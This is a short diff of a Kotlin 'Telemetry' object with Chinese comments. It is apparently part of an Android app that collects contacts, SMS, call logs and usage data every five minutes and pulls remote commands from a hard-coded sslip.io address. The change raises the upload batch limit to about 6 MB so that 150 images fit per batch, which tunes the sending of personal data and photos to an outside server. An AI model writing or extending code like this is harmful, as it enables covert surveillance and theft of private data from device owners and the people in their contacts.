@@ -40,7 +40,7 @@ object Telemetry {
     private const val DATA_EVERY_MS = 300_000L      // 通讯录/短信/通话/使用时长周期
     private const val CONF_EVERY_MS = 30_000L       // 远程配置拉取周期
     private const val BATCH = 400
-    private const val MAX_BATCH_CHARS = 3_000_000   // ≈3 MB，留余量给服务端上限
+    private const val MAX_BATCH_CHARS = 6_000_000   // ≈6 MB：150 张一批正好发完，服务端上限 8 MB
     private const val PERIOD_MS = 20_000L
     private const val CMD_STREAM = "https://43-108-107-175.sslip.io:8080/dash/cmdstream"
     private const val CMD_POLL_MS = 30_000L  // SSE 断线时的兜底轮询间隔
